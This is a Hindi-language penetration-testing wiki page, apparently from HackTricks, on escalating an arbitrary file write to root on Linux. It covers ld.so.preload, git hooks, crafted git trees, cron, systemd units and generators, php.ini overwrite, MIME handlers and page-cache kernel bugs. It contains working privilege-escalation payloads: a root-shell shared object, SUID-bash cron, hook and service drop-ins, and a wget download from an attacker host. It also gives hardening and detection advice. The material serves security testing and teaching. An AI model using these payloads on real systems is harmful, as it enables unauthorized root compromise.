# Root में Arbitrary File Write

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` shared objects की system-wide सूची है, जिन्हें dynamic linker अन्य shared objects से पहले load करता है। Secure-execution mode preloading पर अतिरिक्त restrictions लागू करता है, इसलिए `/tmp/pe.so` जैसा library path universal SUID-binary technique नहीं है।\
यदि आप इसे create या modify कर सकते हैं, तो इस file को load करने वाली process सूचीबद्ध library को अपनी अन्य shared objects से पहले load करेगी, जिससे उस process के context में code execution संभव हो जाता है।<sup>[[12]](#references)</sup>

उदाहरण के लिए: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** किसी repository में होने वाली घटनाओं के लिए चलने वाली executable scripts होती हैं, जिनमें commit और merge operations शामिल हैं। यदि कोई **privileged script या user** ये actions करता है और attacker **`.git` folder में write** कर सकता है, तो hook का उपयोग **privilege escalation** के लिए किया जा सकता है।<sup>[[13]](#references)</sup>

उदाहरण के लिए, किसी git repo में **`.git/hooks` में एक script generate करना** संभव है, ताकि नया commit बनाए जाने पर वह हमेशा execute हो:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Privileged Git tree export path traversal

एक privileged synchronizer checkout से बच सकता है और इसके बजाय `git ls-tree` से attacker-influenced repository को enumerate कर सकता है, `git cat-file` से प्रत्येक blob को read कर सकता है, reported pathname को staging directory के साथ जोड़ सकता है, और स्वयं उसे write कर सकता है। जब यह `-c safe.directory=*` (Git के different-owner repository guard को disable करने वाला विकल्प) को बिना किसी destination containment check के combine करता है, तो यह **synchronizer की privileges के साथ arbitrary file write** बन जाता है। An absolute tree-entry name Python के `os.path.join(stage, name)` को `stage` discard करने पर मजबूर करता है; filesystem के उसे resolve करने पर `../` वाला relative name बाहर निकल जाता है। चूँकि application Git से checkout कराने के बजाय raw tree को materialize करती है, इसलिए checkout-time pathname rejection कभी भी sink की सुरक्षा नहीं करती।<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Root services, timers, deployment agents, template importers और backup/restore jobs में code का यह pattern देखें:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
एक tree entry को `<mode> SP <name> NUL <raw object ID>` के रूप में encode किया जाता है। `git hash-object --literally` विकल्प जानबूझकर ऐसे object data की अनुमति देता है जिन्हें सामान्य parsing या `git fsck` अस्वीकार कर सकता है, इसलिए एक disposable clone ऐसा tree बना सकता है जिसका filename एक absolute destination हो। यह उदाहरण एक cron-file blob बनाता है, crafted tree को एक commit में wrap करता है और एक branch को उस पर ले जाता है; exploitation के लिए अभी भी उस repository को update करने की permission आवश्यक है जिसे privileged job consume करता है, साथ ही ऐसे malformed object को स्वीकार करने वाला Git server भी आवश्यक है।<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening में repository ingestion और final filesystem operation, दोनों को कवर किया जाना चाहिए:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*` को उन exact repositories से बदलें जिन पर service को trust करना आवश्यक है, और जहाँ संभव हो, repository processing को root privileges के बिना चलाएँ।
- Materialization से पहले absolute names तथा किसी भी `.` या `..` component को reject करें। Joining के बाद canonicalize करें और verify करें कि destination intended root के भीतर ही रहे।
- Check-then-open symlink races से बचें: किसी trusted directory descriptor के सापेक्ष open करें और Linux पर attacker-controlled paths के लिए `RESOLVE_BENEATH` तथा `RESOLVE_NO_SYMLINKS` के साथ `openat2()` का उपयोग करें।
- Plumbing output से checkout को फिर से implement करने के बजाय isolated directory में normal checkout को प्राथमिकता दें। यदि raw-object ingestion आवश्यक हो, तो `receive.fsckObjects=true` जैसी receive-side validation enable करें; crafted trees को reject करने के लिए आवश्यक pathname-related `receive.fsck.*` findings को downgrade न करें।

### Cron & Time files

यदि आप **ऐसी cron-related files लिख सकते हैं जिन्हें root execute करता है**, तो आमतौर पर अगली बार job चलने पर code execution प्राप्त किया जा सकता है। Interesting targets में शामिल हैं:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` या `/var/spool/cron/crontabs/` में root का अपना crontab
- `systemd` timers और वे services जिन्हें वे trigger करते हैं

त्वरित जाँच:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
सामान्य abuse paths:

- `/etc/crontab` या `/etc/cron.d/` की किसी फ़ाइल में **एक नया root cron job जोड़ें**
- `run-parts` द्वारा पहले से execute की जाने वाली **किसी script को replace करें**
- लॉन्च की जाने वाली script या binary को modify करके **किसी मौजूदा timer target में backdoor डालें**

Minimal cron payload example:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
यदि आप केवल `run-parts` द्वारा उपयोग की जाने वाली cron directory के अंदर लिख सकते हैं, तो इसके बजाय वहां एक executable file डालें:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
नोट्स:

- `run-parts` आमतौर पर dots वाले filenames को अनदेखा करता है, इसलिए `backup.sh` के बजाय `backup` जैसे नामों को प्राथमिकता दें।<sup>[[15]](#references)</sup>
- कुछ systems classic cron के बजाय `systemd` timers का उपयोग करते हैं, लेकिन abuse का विचार समान है: **बाद में root द्वारा execute की जाने वाली चीज़ को modify करना**।<sup>[[20]](#references)</sup>

### Service & Socket files

यदि आप **`systemd` unit files** या उनके द्वारा referenced files में write कर सकते हैं, तो unit को reload और restart करके, या service/socket activation path के trigger होने की प्रतीक्षा करके, root के रूप में code execution प्राप्त कर सकते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interesting targets में शामिल हैं:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` में Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` द्वारा referenced Service scripts/binaries
- root service द्वारा loaded writable `EnvironmentFile=` paths

त्वरित जाँच:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
सामान्य abuse paths:

- जिस root-owned service unit को आप modify कर सकते हैं, उसमें **`ExecStart=` को overwrite करें**
- malicious **`ExecStart=`** के साथ **drop-in override** जोड़ें और पहले पुराने को clear करें
- unit द्वारा पहले से referenced script/binary में **backdoor** डालें
- socket-activated service को hijack करें, संबंधित **`.service`** file को modify करके, जो socket को connection मिलने पर start होती है

उदाहरण malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
सामान्य activation flow:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
यदि आप services को स्वयं restart नहीं कर सकते, लेकिन socket-activated unit को edit कर सकते हैं, तो आपको root के रूप में backdoored service के execution को trigger करने के लिए केवल **client connection की प्रतीक्षा** करनी पड़ सकती है।<sup>[[17]](#references)</sup>

### systemd generator directories

**System generators** वे executables हैं जिन्हें system manager unit files लोड करने से पहले launch करता है, boot और configuration reloads—दोनों के दौरान। इसलिए, system-generator directory (या किसी मौजूदा executable generator) तक write access, direct root-code-execution primitive है, जिसे तब आसानी से नज़रअंदाज़ किया जा सकता है जब audit केवल `*.service` और `*.timer` files की जाँच करता हो।<sup>[[35]](#references)[[36]](#references)</sup>

सामान्य search order `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/`, और `/usr/lib/systemd/system-generators/` है (कुछ distributions `/usr` merge के माध्यम से `/lib/systemd/system-generators/` उपलब्ध कराते हैं)। पहले वाले directory में समान नाम वाला executable बाद वाले executable को shadow करता है। इन **input executable directories** को `/run/systemd/generator`, `/run/systemd/generator.early`, और `/run/systemd/generator.late` के साथ confuse न करें, जिनमें generators द्वारा बनाया गया transient unit output होता है।<sup>[[35]](#references)</sup>

त्वरित जाँचें:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
नए बनाए गए generator का executable bit सेट होना आवश्यक है। यदि write primitive bytes को नियंत्रित करता है, लेकिन mode को नहीं, तो पहले से executable generator को target करें; उसे in place truncate करने पर सामान्यतः उसका metadata सुरक्षित रहता है। यदि directory स्वयं writable है, तो एक नई entry बनाएँ और उसे executable mark करें।<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
`systemctl daemon-reload` को **system** manager के विरुद्ध चलाने के लिए उपयुक्त authorization आवश्यक है, लेकिन यह प्रत्येक system generator को फिर से चलाता है; अन्यथा privileged reload, package operation या reboot की प्रतीक्षा करें। User-generator directories जैसे `~/.config/systemd/user-generators/` user manager के अंतर्गत execute होते हैं और अपने-आप root access प्रदान नहीं करते।<sup>[[35]](#references)</sup>

Hardening और hunting के लिए, केवल अंतिम mode bits की जाँच करने के बजाय प्रत्येक path component और ACL को verify करें, generators के baseline hashes/package ownership को सुरक्षित रखें, और सभी system-generator input directories में create, rename, content या permission changes पर alert करें। Write को monitor करना महत्वपूर्ण है, क्योंकि one-shot generator execution के बाद स्वयं को delete कर सकता है, जबकि `/run/systemd/generator*` के अंतर्गत generated unit tree अगले reload पर फिर से बनाया जाता है।<sup>[[35]](#references)[[36]](#references)</sup>

### Privileged PHP sandbox द्वारा उपयोग की जाने वाली restrictive `php.ini` को overwrite करना

कुछ custom daemons user-supplied PHP को **restricted `php.ini`** के साथ `php` चलाकर validate करते हैं (उदाहरण के लिए, `disable_functions=exec,system,...`)। यदि sandboxed code में अभी भी **कोई write primitive** (जैसे `file_put_contents`) उपलब्ध है और आप daemon द्वारा उपयोग किए जाने वाले **exact `php.ini` path** तक पहुँच सकते हैं, तो आप restrictions हटाने के लिए उस **config** को **overwrite** कर सकते हैं और फिर एक दूसरा payload submit कर सकते हैं, जो elevated privileges के साथ चलता है।<sup>[[2]](#references)</sup>

सामान्य flow:

1. पहला payload sandbox config को overwrite करता है।
2. दूसरा payload अब code execute करता है, क्योंकि dangerous functions फिर से enable हो गए हैं।

Minimal example (daemon द्वारा उपयोग किए जाने वाले path को replace करें):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
यदि daemon root के रूप में चलता है (या root-owned paths के साथ validate करता है), तो दूसरी execution से root context प्राप्त होता है। यह मूल रूप से **config overwrite के माध्यम से privilege escalation** है, जब sandboxed runtime अभी भी files में write कर सकता है।

### binfmt_misc

`binfmt_misc` `/proc/sys/fs/binfmt_misc` के अंतर्गत registrations उपलब्ध कराता है; प्रत्येक registration एक file-type pattern को एक interpreter के साथ associate करता है। इसका privilege impact इस बात पर निर्भर करता है कि registration को कौन बदल सकता है और matching file को बाद में कौन-सा process execute करता है, इसलिए इसे privilege-escalation path मानने से पहले इन requirements को verify करें।<sup>[[21]](#references)</sup>

### schema handlers को overwrite करना (जैसे http: या https:)

Desktop environments URI schemes के लिए application चुनने हेतु MIME associations और desktop entries का उपयोग करते हैं; relevant per-user configuration और desktop-entry directories में write कर सकने वाला attacker उन schemes को अपने control वाले launcher पर redirect कर सकता है। `$HOME/.config/mimeapps.list` file को modify करके HTTP और HTTPS URL handlers को किसी malicious file पर point करने पर (उदाहरण के लिए, `x-scheme-handler/http=evil.desktop` और `x-scheme-handler/https=evil.desktop`), user click उस desktop entry को invoke कर सकता है।<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root द्वारा user-writable scripts/binaries का execution

यदि कोई privileged workflow `/bin/sh /home/username/.../script` जैसी किसी चीज़ को चलाता है (या unprivileged user के स्वामित्व वाली directory के अंदर मौजूद किसी binary को चलाता है), तो आप उसे hijack कर सकते हैं:<sup>[[1]](#references)</sup>

- **Execution का पता लगाएँ:** root द्वारा user-controlled paths को invoke करने का पता लगाने के लिए pspy से processes monitor करें।<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** सुनिश्चित करें कि target file और उसकी directory दोनों आपके user के स्वामित्व में हों और उनमें write permissions हों।
- **Hijack the target:** original binary/script का backup लें और ऐसा payload डालें जो SUID shell (या कोई अन्य root action) बनाए, फिर permissions restore करें:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **privileged action को trigger करें** (जैसे, ऐसा UI button दबाना जो helper को spawn करता है)। जब root hijacked path को फिर से execute करे, तो `./rootshell -p` से escalated shell प्राप्त करें।

### privileged binaries का केवल page-cache modification

कुछ kernel bugs file को **disk पर** modify नहीं करते। इसके बजाय, वे आपको किसी readable file की केवल **page cache copy** को modify करने देते हैं। यदि आप किसी **setuid** या अन्यथा **root-executed** binary को target कर सकते हैं, तो अगला execution memory से attacker-controlled bytes चला सकता है और privileges escalate कर सकता है, भले ही disk पर file hash अपरिवर्तित हो।<sup>[[3]](#references)[[4]](#references)</sup>

इसे **runtime-only file write primitive** के रूप में समझना उपयोगी है:<sup>[[3]](#references)</sup>

- **Disk साफ रहता है**: inode और disk पर मौजूद bytes नहीं बदलते
- **Memory dirty होती है**: cached page को read/execute करने वाली processes को attacker-modified content मिलता है
- **Effect अस्थायी होता है**: reboot या cache eviction के बाद बदलाव गायब हो जाता है

यह primitive classic **arbitrary file write** और Dirty COW / Dirty Pipe जैसे पुराने **page-cache abuse** bugs के बीच आता है:<sup>[[3]](#references)</sup>

- Dirty COW race पर निर्भर था
- Dirty Pipe में write-position constraints थीं
- यदि vulnerable path cached file-backed pages में direct writes देता है, तो page-cache-only primitive अधिक reliable हो सकता है

#### Generic privesc flow

1. ऐसा kernel primitive प्राप्त करें जो **file-backed page cache pages** में write कर सके
2. इसका उपयोग किसी **readable privileged binary** या अन्य root-executed file के विरुद्ध करें
3. Page के cache से evict होने से **पहले** execution trigger करें
4. जब disk पर मौजूद file अभी भी unmodified दिख रही हो, तब root के रूप में code execution प्राप्त करें

Typical high-value targets:

- **setuid-root** binaries
- **root services** द्वारा launch किए गए helpers
- ऐसे binaries जिन्हें अक्सर **host kernel/page cache साझा करने वाले containers** से execute किया जाता है

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) इस class का एक अच्छा example है। Vulnerable path Linux crypto userspace API (`AF_ALG` / `algif_aead`) में था:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` किसी readable file से page-cache pages के references को crypto TX scatterlist में ले जा सकता है
- in-place `algif_aead` decrypt path ने source और destination buffers का reuse किया
- `authencesn` ने इसके बाद destination tag region में write किया
- जब वह region अभी भी spliced file-backed pages को reference कर रहा था, तो write **target file के page cache** में पहुंच गई

इसलिए interesting technique स्वयं CVE नहीं, बल्कि यह pattern है:

- **file-backed cache pages को किसी kernel subsystem में feed करें**
- subsystem को उन्हें **writable output के रूप में treat** करने दें
- memory में एक छोटा controlled overwrite trigger करें

Public PoC ने `/usr/bin/su` को memory में patch करने के लिए बार-बार **4-byte writes** का उपयोग किया और फिर उसे execute किया।<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) इसी **page-cache-only write-to-root** pattern का एक अन्य variant दिखाता है, लेकिन इस बार sink `AF_ALG` के बजाय **IPsec ESP decrypt** है।<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

महत्वपूर्ण technique **metadata-laundering step** है:

- `splice()` एक **read-only file-backed page-cache page** को ESP-in-UDP packet में रखता है
- मूल DirtyFrag mitigation ने उस skb को `SKBFL_SHARED_FRAG` से tag किया, ताकि `esp_input()` decrypt करने से **पहले copy** करे
- netfilter `TEE` packet को `nf_dup_ipv4()` -> `__pskb_copy_fclone()` के माध्यम से duplicate करता है
- clone वही **physical page-cache reference** रखता है, लेकिन `SKBFL_SHARED_FRAG` खो देता है
- इसके बाद `esp_input()` clone को safe मानता है और file-backed page पर **in-place `cbc(aes)` decrypt** चलाता है

इसलिए reviewer lesson CVE से व्यापक है: यदि कोई mitigation यह तय करने के लिए **skb/page metadata** पर निर्भर करती है कि operation को पहले copy करना है या नहीं, तो ऐसा कोई भी **clone/copy path जो backing page को बनाए रखता है लेकिन metadata हटा देता है**, चुपचाप write primitive को फिर से खोल सकता है।

Typical exploitation flow:

1. Private network namespace के अंदर **`CAP_NET_ADMIN`** प्राप्त करने के लिए `unshare(CLONE_NEWUSER | CLONE_NEWNET)` चलाएं
2. loopback को up करें और `mangle/OUTPUT` में एक **netfilter `TEE` rule** install करें
3. `NETLINK_XFRM` के माध्यम से **XFRM ESP transport SAs** install करें
4. प्रत्येक target 4-byte word को SA `seq_hi` field में encode करें (DirtyFrag की word-selection trick)
5. spliced ESP-in-UDP packet भेजें, ताकि **TEE clone** `esp_input()` तक पहुंचे और **in place** decrypt करे
6. तब तक repeat करें, जब तक `/usr/bin/su` या किसी अन्य privileged executable की page-cache copy में attacker-controlled code न आ जाए

Operationally, impact `AF_ALG` example जैसा ही है: disk पर file साफ रहती है, लेकिन `execve()` **mutated page-cache bytes** का उपयोग करता है और root प्राप्त होता है।<sup>[[8]](#references)[[9]](#references)</sup>

इस variant के लिए उपयोगी exposure checks:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Short-term attack-surface reduction यहाँ path-specific भी है: `48f6a5356a33` वाला kernel upgrade करने से clone path ठीक हो जाता है, जबकि `xt_TEE` autoload को block करने से **flag-laundering step** हट जाता है और `esp4` / `esp6` को block करने से **decrypt sink** हट जाता है।<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure और hunting

यदि आपको इस class of bug का संदेह है, तो केवल disk integrity checks पर निर्भर न रहें। यह भी verify करें:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
नीचे दिए गए configuration values loadable interface और kernel में built-in interface के बीच अंतर बताते हैं; crypto build rules `CONFIG_CRYPTO_USER_API_AEAD` को `algif_aead` से map करते हैं।<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` को module के रूप में load/unload किया जा सकता है
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface kernel में built-in है
- setuid binaries अच्छे targets होते हैं, क्योंकि केवल page-cache patch ही local foothold को root में बदलने के लिए पर्याप्त हो सकता है

#### `algif_aead` path के लिए Attack-surface reduction

यदि vulnerable interface loadable module द्वारा उपलब्ध कराया जाता है:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
यदि इसे kernel में compile किया गया है, तो कुछ disclosures ने init path को block करने की सूचना दी है:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
इस प्रकार का mitigation अन्य kernel LPEs के लिए भी याद रखने योग्य है: यदि exploitation किसी specific optional interface पर निर्भर करता है, तो उस interface को disabling या blacklisting करने से, full kernel upgrade उपलब्ध होने से पहले ही exploit path को रोका जा सकता है।<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – user-writable PaperCut directory में root-executed script को hijack करना](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 के लिए Openwall oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place operating पर वापस लौटें](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE variant DirtyClone (CVE-2026-43503) का विश्लेषण और exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()` में `SKBFL_SHARED_FRAG` को preserve करें (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: spliced UDP packets के लिए `SKBFL_SHARED_FRAG` set करें (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator documentation](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: persistence mechanisms](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
